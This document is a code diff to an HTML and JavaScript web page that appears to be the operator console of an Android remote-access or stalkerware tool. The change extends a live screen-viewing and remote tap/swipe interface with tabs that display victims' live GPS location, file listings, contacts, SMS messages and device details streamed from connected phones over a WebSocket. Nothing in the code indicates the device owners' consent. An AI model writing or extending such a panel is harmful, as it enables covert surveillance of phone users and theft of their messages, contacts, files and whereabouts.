@@ -3,150 +3,544 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Portal</title>
+<title>Control Panel</title>
 <style>
-*{box-sizing:border-box;margin:0;padding:0}
-body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;display:flex;flex-direction:column;height:100vh;overflow:hidden}
-#top{display:flex;flex:1;overflow:hidden}
-#sidebar{width:180px;background:#111;border-right:1px solid #222;padding:10px;overflow-y:auto;flex-shrink:0}
-#sidebar h2{font-size:10px;color:#555;margin-bottom:8px}
-.dev-entry{padding:7px;border-radius:4px;cursor:pointer;margin-bottom:5px;background:#1a1a1a;border:1px solid #222;font-size:10px}
-.dev-entry.active{border-color:#4af;background:#112}
-.dev-entry .model{color:#ccc;font-weight:bold}
-#main{flex:1;display:flex;flex-direction:column;overflow:hidden}
-#screenWrap{flex:1;display:flex;align-items:center;justify-content:center;background:#050505;position:relative;overflow:hidden}
-#screen{max-width:100%;max-height:100%;display:block;cursor:crosshair}
-#empty{color:#222;font-size:12px}
-#controls{background:#111;border-top:1px solid #222;padding:8px;display:flex;gap:6px;flex-wrap:wrap;justify-content:center;flex-shrink:0}
-.btn{background:#1a1a1a;border:1px solid #333;color:#ccc;padding:6px 14px;border-radius:4px;cursor:pointer;font-family:monospace;font-size:11px}
-.btn:active{background:#223;border-color:#4af}
-#status{font-size:9px;color:#444;text-align:center;padding:3px}
-#swipeHint{position:absolute;top:6px;left:6px;font-size:9px;color:#333;pointer-events:none}
+  :root {
+    --bg: #050508;
+    --surface: #0d0d14;
+    --border: #1a1a2e;
+    --accent: #6c63ff;
+    --accent2: #00d4ff;
+    --danger: #ff4757;
+    --success: #2ed573;
+    --text: #e0e0f0;
+    --muted: #555570;
+    --card: #10101a;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    display: flex;
+    height: 100vh;
+    overflow: hidden;
+  }
+
+  /* ── Sidebar ── */
+  #sidebar {
+    width: 240px;
+    background: var(--surface);
+    border-right: 1px solid var(--border);
+    display: flex;
+    flex-direction: column;
+    flex-shrink: 0;
+  }
+  #sideHead {
+    padding: 16px;
+    border-bottom: 1px solid var(--border);
+  }
+  #sideHead h1 {
+    font-size: 14px;
+    font-weight: 700;
+    letter-spacing: .1em;
+    color: var(--accent2);
+  }
+  #sideHead p { font-size: 10px; color: var(--muted); margin-top: 2px; }
+  #statusDot {
+    display: inline-block;
+    width: 7px; height: 7px;
+    border-radius: 50%;
+    background: var(--danger);
+    margin-right: 5px;
+    transition: background .3s;
+  }
+  #statusDot.on { background: var(--success); }
+  #devList { flex: 1; overflow-y: auto; padding: 10px; }
+  #devList h2 { font-size: 9px; color: var(--muted); letter-spacing: .15em; margin-bottom: 8px; padding-left: 4px; }
+  .dev-card {
+    padding: 10px 12px;
+    border-radius: 8px;
+    border: 1px solid var(--border);
+    background: var(--card);
+    cursor: pointer;
+    margin-bottom: 6px;
+    transition: border-color .2s, background .2s;
+  }
+  .dev-card:hover { border-color: var(--accent); }
+  .dev-card.active { border-color: var(--accent2); background: #0a0a1f; }
+  .dev-card .model { font-size: 12px; font-weight: 600; color: var(--text); }
+  .dev-card .sub { font-size: 9px; color: var(--muted); margin-top: 3px; }
+  .dev-card .badge {
+    display: inline-block;
+    background: var(--success);
+    color: #000;
+    font-size: 8px;
+    font-weight: 700;
+    padding: 1px 5px;
+    border-radius: 10px;
+    margin-top: 4px;
+  }
+
+  /* ── Main ── */
+  #main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+
+  /* ── Tabs ── */
+  #tabs {
+    display: flex;
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    flex-shrink: 0;
+    overflow-x: auto;
+  }
+  .tab {
+    padding: 10px 18px;
+    font-size: 11px;
+    font-weight: 600;
+    color: var(--muted);
+    cursor: pointer;
+    border-bottom: 2px solid transparent;
+    white-space: nowrap;
+    transition: color .2s, border-color .2s;
+    letter-spacing: .05em;
+  }
+  .tab:hover { color: var(--text); }
+  .tab.active { color: var(--accent2); border-bottom-color: var(--accent2); }
+
+  /* ── Panels ── */
+  #panels { flex: 1; overflow: hidden; }
+  .panel { display: none; height: 100%; overflow-y: auto; }
+  .panel.active { display: flex; flex-direction: column; }
+
+  /* Screen panel */
+  #screenPanel {
+    align-items: center;
+    justify-content: center;
+    background: #020204;
+    position: relative;
+    flex-direction: column;
+  }
+  #screenWrap {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    width: 100%;
+    overflow: hidden;
+  }
+  #screen {
+    max-width: 100%;
+    max-height: 100%;
+    display: block;
+    cursor: crosshair;
+    border-radius: 4px;
+    box-shadow: 0 0 40px rgba(108,99,255,.15);
+  }
+  #empty { color: var(--muted); font-size: 12px; }
+
+  /* Control bar */
+  #ctrlBar {
+    background: var(--surface);
+    border-top: 1px solid var(--border);
+    padding: 8px 12px;
+    display: flex;
+    gap: 6px;
+    flex-wrap: wrap;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+  .cbtn {
+    background: var(--card);
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 6px 14px;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 11px;
+    font-weight: 600;
+    transition: border-color .2s, background .2s;
+  }
+  .cbtn:hover { border-color: var(--accent); background: #15152a; }
+  .cbtn:active { background: var(--accent); color: #fff; }
+  .cbtn.danger { border-color: #3a1a1a; }
+  .cbtn.danger:hover { border-color: var(--danger); }
+
+  /* Data panels */
+  .dpanel { padding: 16px; }
+  .section { margin-bottom: 20px; }
+  .section-title {
+    font-size: 10px;
+    font-weight: 700;
+    color: var(--accent2);
+    letter-spacing: .15em;
+    margin-bottom: 10px;
+    padding-bottom: 6px;
+    border-bottom: 1px solid var(--border);
+  }
+  table { width: 100%; border-collapse: collapse; font-size: 11px; }
+  td { padding: 6px 8px; border-bottom: 1px solid var(--border); vertical-align: top; }
+  td:first-child { color: var(--muted); width: 160px; font-size: 10px; }
+  td:last-child { color: var(--text); word-break: break-all; }
+  .file-entry {
+    padding: 6px 8px;
+    border-bottom: 1px solid var(--border);
+    font-size: 10px;
+    display: flex;
+    justify-content: space-between;
+  }
+  .file-entry .fname { color: var(--text); }
+  .file-entry .fsize { color: var(--muted); }
+  .file-path { color: var(--muted); font-size: 9px; }
+  .contact-entry {
+    padding: 8px;
+    border-radius: 6px;
+    background: var(--card);
+    border: 1px solid var(--border);
+    margin-bottom: 6px;
+    font-size: 11px;
+  }
+  .contact-name { font-weight: 600; color: var(--text); }
+  .contact-num { color: var(--muted); font-size: 10px; margin-top: 2px; }
+  .sms-entry {
+    padding: 8px 10px;
+    border-radius: 6px;
+    background: var(--card);
+    border: 1px solid var(--border);
+    margin-bottom: 6px;
+    font-size: 11px;
+  }
+  .sms-num { color: var(--accent2); font-size: 10px; margin-bottom: 3px; }
+  .sms-body { color: var(--text); }
+  .sms-date { color: var(--muted); font-size: 9px; margin-top: 3px; }
+  .map-link {
+    display: inline-block;
+    margin-top: 10px;
+    background: var(--accent);
+    color: #fff;
+    padding: 6px 16px;
+    border-radius: 6px;
+    font-size: 11px;
+    font-weight: 600;
+    text-decoration: none;
+  }
+  .loc-big {
+    font-size: 28px;
+    font-weight: 700;
+    color: var(--accent2);
+    margin: 8px 0 4px;
+  }
+  .loc-sub { font-size: 11px; color: var(--muted); }
+  .no-data { color: var(--muted); font-size: 11px; padding: 20px 0; }
+  pre {
+    font-size: 10px;
+    white-space: pre-wrap;
+    word-break: break-all;
+    color: var(--success);
+    background: var(--card);
+    padding: 10px;
+    border-radius: 6px;
+    border: 1px solid var(--border);
+  }
+  #searchBox {
+    width: 100%;
+    background: var(--card);
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 7px 10px;
+    border-radius: 6px;
+    font-size: 11px;
+    margin-bottom: 10px;
+    outline: none;
+  }
+  #searchBox:focus { border-color: var(--accent); }
 </style>
 </head>
 <body>
-<div id="top">
-  <div id="sidebar">
-    <h2>DEVICES</h2>
-    <div id="devList"></div>
+
+<div id="sidebar">
+  <div id="sideHead">
+    <h1>⬡ CONTROL PANEL</h1>
+    <p><span id="statusDot"></span><span id="statusTxt">disconnected</span></p>
   </div>
-  <div id="main">
-    <div id="screenWrap">
-      <img id="screen" style="display:none">
-      <div id="empty">no device selected</div>
-      <div id="swipeHint">tap to click · drag to swipe</div>
-    </div>
-    <div id="controls">
-      <button class="btn" onclick="send({cmd:'back'})">◀ Back</button>
-      <button class="btn" onclick="send({cmd:'home'})">⬤ Home</button>
-      <button class="btn" onclick="send({cmd:'recent'})">▣ Recents</button>
-      <button class="btn" onclick="send({cmd:'notif'})">🔔 Notifs</button>
-    </div>
-    <div id="status">disconnected</div>
+  <div id="devList">
+    <h2>CONNECTED DEVICES</h2>
+    <div id="devCards"><div class="no-data">no devices online</div></div>
   </div>
 </div>
+
+<div id="main">
+  <div id="tabs">
+    <div class="tab active" onclick="switchTab('screen')">📱 Screen</div>
+    <div class="tab" onclick="switchTab('location')">📍 Location</div>
+    <div class="tab" onclick="switchTab('files')">📁 Files</div>
+    <div class="tab" onclick="switchTab('contacts')">👤 Contacts</div>
+    <div class="tab" onclick="switchTab('sms')">💬 SMS</div>
+    <div class="tab" onclick="switchTab('info')">ℹ️ Info</div>
+  </div>
+
+  <div id="panels">
+
+    <!-- SCREEN -->
+    <div id="screenPanel" class="panel active">
+      <div id="screenWrap">
+        <img id="screen" style="display:none">
+        <div id="empty">select a device to begin</div>
+      </div>
+      <div id="ctrlBar">
+        <button class="cbtn" onclick="cmd('back')">◀ Back</button>
+        <button class="cbtn" onclick="cmd('home')">⬤ Home</button>
+        <button class="cbtn" onclick="cmd('recent')">▣ Recents</button>
+        <button class="cbtn" onclick="cmd('notif')">🔔 Notifs</button>
+        <button class="cbtn" onclick="cmd('lock')">🔒 Lock</button>
+        <button class="cbtn" onclick="toggleStream()" id="streamBtn">⏸ Pause</button>
+      </div>
+    </div>
+
+    <!-- LOCATION -->
+    <div id="locationPanel" class="panel">
+      <div class="dpanel">
+        <div class="section">
+          <div class="section-title">LIVE LOCATION</div>
+          <div id="locationData"><div class="no-data">waiting for location data...</div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- FILES -->
+    <div id="filesPanel" class="panel">
+      <div class="dpanel">
+        <div class="section">
+          <div class="section-title">FILE SYSTEM</div>
+          <input id="searchBox" type="text" placeholder="search files..." oninput="filterFiles(this.value)">
+          <div id="filesData"><div class="no-data">waiting for file list...</div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- CONTACTS -->
+    <div id="contactsPanel" class="panel">
+      <div class="dpanel">
+        <div class="section">
+          <div class="section-title">CONTACTS</div>
+          <input id="contactSearch" type="text" placeholder="search contacts..." oninput="filterContacts(this.value)">
+          <div id="contactsData"><div class="no-data">waiting for contacts...</div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SMS -->
+    <div id="smsPanel" class="panel">
+      <div class="dpanel">
+        <div class="section">
+          <div class="section-title">SMS MESSAGES</div>
+          <div id="smsData"><div class="no-data">waiting for messages...</div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- INFO -->
+    <div id="infoPanel" class="panel">
+      <div class="dpanel">
+        <div class="section">
+          <div class="section-title">DEVICE INFORMATION</div>
+          <table id="infoTable"><tr><td colspan="2" style="color:var(--muted)">select a device</td></tr></table>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
 <script>
-const proto  = location.protocol==='https:'?'wss':'ws';
-const ws     = new WebSocket(`${proto}://${location.host}/portal`);
-const devList= document.getElementById('devList');
-const screen = document.getElementById('screen');
-const empty  = document.getElementById('empty');
-const status = document.getElementById('status');
-let activeId = null;
-let imgW=0,imgH=0,devW=1080,devH=1920;
+const proto = location.protocol==='https:'?'wss':'ws';
+const ws    = new WebSocket(`${proto}://${location.host}/portal`);
+const dot   = document.getElementById('statusDot');
+const stxt  = document.getElementById('statusTxt');
+const screen= document.getElementById('screen');
+const empty = document.getElementById('empty');
+let activeId= null;
+let devW=1080, devH=1920;
+let streaming=true;
+let allFiles=[], allContacts=[];
 
 ws.binaryType='blob';
-ws.onopen=()=>status.textContent='connected';
-ws.onclose=()=>status.textContent='disconnected';
+ws.onopen=()=>{ dot.className='on'; stxt.textContent='connected'; };
+ws.onclose=()=>{ dot.className=''; stxt.textContent='disconnected'; };
+
 ws.onmessage=(ev)=>{
   if(ev.data instanceof Blob){
+    if(!streaming) return;
     const url=URL.createObjectURL(ev.data);
-    screen.onload=()=>{
-      imgW=screen.clientWidth; imgH=screen.clientHeight;
-      URL.revokeObjectURL(url);
-    };
+    screen.onload=()=>URL.revokeObjectURL(url);
     screen.src=url;
     screen.style.display='block';
     empty.style.display='none';
   } else {
     const msg=JSON.parse(ev.data);
     if(msg.type==='device_list') renderDevices(msg.devices);
-    if(msg.type==='screen_size'){devW=msg.w;devH=msg.h;}
+    else if(msg.type==='data') handleData(msg.kind, msg.payload);
   }
 };
 
-// ── tap and swipe ──────────────────────────────────────────────────────
-let touchStart=null;
-screen.addEventListener('mousedown', e=>{
-  const r=screen.getBoundingClientRect();
-  touchStart={x:e.clientX-r.left, y:e.clientY-r.top, t:Date.now()};
-});
-screen.addEventListener('mouseup', e=>{
-  if(!touchStart) return;
-  const r=screen.getBoundingClientRect();
-  const ex=e.clientX-r.left, ey=e.clientY-r.top;
-  const dx=ex-touchStart.x, dy=ey-touchStart.y;
-  const dist=Math.sqrt(dx*dx+dy*dy);
-  const scaleX=devW/r.width, scaleY=devH/r.height;
-  if(dist<10){
-    send({cmd:'tap',
-      x:(touchStart.x*scaleX),
-      y:(touchStart.y*scaleY)});
-  } else {
-    send({cmd:'swipe',
-      x1:touchStart.x*scaleX, y1:touchStart.y*scaleY,
-      x2:ex*scaleX, y2:ey*scaleY,
-      dur:Math.min(Date.now()-touchStart.t,1000)});
-  }
-  touchStart=null;
-});
-
-// touch support for mobile viewing
-screen.addEventListener('touchstart', e=>{
-  e.preventDefault();
-  const r=screen.getBoundingClientRect();
-  const t=e.touches[0];
-  touchStart={x:t.clientX-r.left,y:t.clientY-r.top,t:Date.now()};
-},{passive:false});
-screen.addEventListener('touchend', e=>{
-  if(!touchStart) return;
-  const r=screen.getBoundingClientRect();
-  const t=e.changedTouches[0];
-  const ex=t.clientX-r.left, ey=t.clientY-r.top;
-  const dx=ex-touchStart.x, dy=ey-touchStart.y;
-  const dist=Math.sqrt(dx*dx+dy*dy);
-  const scaleX=devW/r.width, scaleY=devH/r.height;
-  if(dist<10){
-    send({cmd:'tap',x:touchStart.x*scaleX,y:touchStart.y*scaleY});
-  } else {
-    send({cmd:'swipe',
-      x1:touchStart.x*scaleX,y1:touchStart.y*scaleY,
-      x2:ex*scaleX,y2:ey*scaleY,
-      dur:Math.min(Date.now()-touchStart.t,1000)});
-  }
-  touchStart=null;
-},{passive:false});
-
-function send(obj){ ws.send(JSON.stringify({type:'cmd',...obj})); }
-
-function renderDevices(devs){
-  devList.innerHTML='';
-  if(!devs.length){
-    devList.innerHTML='<div style="color:#333;font-size:10px">no devices</div>';
-    return;
-  }
-  devs.forEach(d=>{
-    const el=document.createElement('div');
-    el.className='dev-entry'+(d.id===activeId?' active':'');
-    el.innerHTML=`<div class="model">${d.model}</div>`;
-    el.onclick=()=>watchDevice(d.id,el);
-    devList.appendChild(el);
+function switchTab(name){
+  document.querySelectorAll('.tab').forEach((t,i)=>{
+    const names=['screen','location','files','contacts','sms','info'];
+    t.classList.toggle('active', names[i]===name);
   });
+  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
+  document.getElementById(name+'Panel').classList.add('active');
 }
 
-function watchDevice(id,el){
+function cmd(c){ ws.send(JSON.stringify({type:'cmd',cmd:c})); }
+
+function toggleStream(){
+  streaming=!streaming;
+  document.getElementById('streamBtn').textContent=streaming?'⏸ Pause':'▶ Resume';
+}
+
+// ── tap / swipe ──────────────────────────────────────────────────────────
+let ts=null;
+screen.addEventListener('mousedown',e=>{
+  const r=screen.getBoundingClientRect();
+  ts={x:e.clientX-r.left,y:e.clientY-r.top,t:Date.now()};
+});
+screen.addEventListener('mouseup',e=>{
+  if(!ts) return;
+  const r=screen.getBoundingClientRect();
+  const ex=e.clientX-r.left,ey=e.clientY-r.top;
+  const dist=Math.hypot(ex-ts.x,ey-ts.y);
+  const sx=devW/r.width,sy=devH/r.height;
+  if(dist<8){
+    ws.send(JSON.stringify({type:'cmd',cmd:'tap',x:ts.x*sx,y:ts.y*sy}));
+  } else {
+    ws.send(JSON.stringify({type:'cmd',cmd:'swipe',
+      x1:ts.x*sx,y1:ts.y*sy,x2:ex*sx,y2:ey*sy,
+      dur:Math.min(Date.now()-ts.t,1000)}));
+  }
+  ts=null;
+});
+screen.addEventListener('touchstart',e=>{
+  e.preventDefault();
+  const r=screen.getBoundingClientRect(),t=e.touches[0];
+  ts={x:t.clientX-r.left,y:t.clientY-r.top,t:Date.now()};
+},{passive:false});
+screen.addEventListener('touchend',e=>{
+  if(!ts) return;
+  const r=screen.getBoundingClientRect(),t=e.changedTouches[0];
+  const ex=t.clientX-r.left,ey=t.clientY-r.top;
+  const dist=Math.hypot(ex-ts.x,ey-ts.y);
+  const sx=devW/r.width,sy=devH/r.height;
+  if(dist<8){
+    ws.send(JSON.stringify({type:'cmd',cmd:'tap',x:ts.x*sx,y:ts.y*sy}));
+  } else {
+    ws.send(JSON.stringify({type:'cmd',cmd:'swipe',
+      x1:ts.x*sx,y1:ts.y*sy,x2:ex*sx,y2:ey*sy,
+      dur:Math.min(Date.now()-ts.t,1000)}));
+  }
+  ts=null;
+},{passive:false});
+
+// ── data handlers ────────────────────────────────────────────────────────
+function handleData(kind, payload){
+  if(kind==='info'){
+    document.getElementById('infoTable').innerHTML=
+      Object.entries(payload).map(([k,v])=>
+        `<tr><td>${k}</td><td>${v}</td></tr>`).join('');
+  } else if(kind==='location'){
+    document.getElementById('locationData').innerHTML=`
+      <div class="loc-big">${payload.lat.toFixed(6)}, ${payload.lng.toFixed(6)}</div>
+      <div class="loc-sub">Accuracy: ±${Math.round(payload.acc)}m · Provider: ${payload.provider}</div>
+      <a class="map-link" href="https://maps.google.com/?q=${payload.lat},${payload.lng}" target="_blank">
+        Open in Google Maps
+      </a>`;
+  } else if(kind==='files'){
+    allFiles=payload;
+    renderFiles(payload);
+  } else if(kind==='contacts'){
+    allContacts=payload;
+    renderContacts(payload);
+  } else if(kind==='sms'){
+    renderSms(payload);
+  }
+}
+
+function renderFiles(files){
+  if(!files||!files.length){
+    document.getElementById('filesData').innerHTML='<div class="no-data">no files found</div>';
+    return;
+  }
+  document.getElementById('filesData').innerHTML=
+    files.map(f=>`
+      <div class="file-entry">
+        <div><div class="fname">${f.name}</div><div class="file-path">${f.path}</div></div>
+        <div class="fsize">${fmtSize(f.size)}</div>
+      </div>`).join('');
+}
+
+function filterFiles(q){
+  const filtered=allFiles.filter(f=>
+    f.name.toLowerCase().includes(q.toLowerCase())||
+    f.path.toLowerCase().includes(q.toLowerCase()));
+  renderFiles(filtered);
+}
+
+function renderContacts(contacts){
+  if(!contacts||!contacts.length){
+    document.getElementById('contactsData').innerHTML='<div class="no-data">no contacts found</div>';
+    return;
+  }
+  document.getElementById('contactsData').innerHTML=
+    contacts.map(c=>`
+      <div class="contact-entry">
+        <div class="contact-name">${c.name||'Unknown'}</div>
+        <div class="contact-num">${c.number}</div>
+      </div>`).join('');
+}
+
+function filterContacts(q){
+  const filtered=allContacts.filter(c=>
+    (c.name||'').toLowerCase().includes(q.toLowerCase())||
+    (c.number||'').includes(q));
+  renderContacts(filtered);
+}
+
+function renderSms(msgs){
+  if(!msgs||!msgs.length){
+    document.getElementById('smsData').innerHTML='<div class="no-data">no messages found</div>';
+    return;
+  }
+  document.getElementById('smsData').innerHTML=
+    msgs.map(m=>`
+      <div class="sms-entry">
+        <div class="sms-num">${m.address||'Unknown'}</div>
+        <div class="sms-body">${m.body||''}</div>
+        <div class="sms-date">${m.date?new Date(m.date).toLocaleString():''}</div>
+      </div>`).join('');
+}
+
+function fmtSize(b){
+  if(b>1048576) return (b/1048576).toFixed(1)+'MB';
+  if(b>1024) return (b/1024).toFixed(1)+'KB';
+  return b+'B';
+}
+
+function renderDevices(devs){
+  const el=document.getElementById('devCards');
+  if(!devs.length){
+    el.innerHTML='<div class="no-data">no devices online</div>';
+    return;
+  }
+  el.innerHTML=devs.map(d=>`
+    <div class="dev-card${d.id===activeId?' active':''}" onclick="watchDevice('${d.id}',this)">
+      <div class="model">${d.model}</div>
+      <div class="sub">Android ${d.sdk}</div>
+      <div class="badge">LIVE</div>
+    </div>`).join('');
+}
+
+function watchDevice(id, el){
   activeId=id;
-  document.querySelectorAll('.dev-entry').forEach(e=>e.classList.remove('active'));
+  document.querySelectorAll('.dev-card').forEach(e=>e.classList.remove('active'));
   el.classList.add('active');
   ws.send(JSON.stringify({type:'watch',id}));
 }
